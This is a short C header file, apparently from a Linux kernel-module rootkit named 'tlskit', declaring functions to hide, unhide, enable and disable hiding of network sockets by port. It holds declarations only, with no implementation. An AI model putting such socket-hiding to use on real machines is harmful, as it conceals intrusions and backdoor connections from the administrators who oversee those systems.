#ifndef LKM_TLSKIT_SOCKET_HIDING_H
#define LKM_TLSKIT_SOCKET_HIDING_H

/**
 * Hide a socket
 * @param port
 * @return 0 on success, -1 else
 */
int hide_socket(unsigned short port);

/**
 * Unhide a socket
 * @param port
 * @return 0 on success, -1 else
 */
int unhide_socket(unsigned short port);

/**
 * Enable socket hiding
 * @return 0 on success, -1 else
 */
int enable_socket_hiding(void);

/**
 * Disable socket hiding
 */
void disable_socket_hiding(void);

#endif //LKM_TLSKIT_SOCKET_HIDING_H
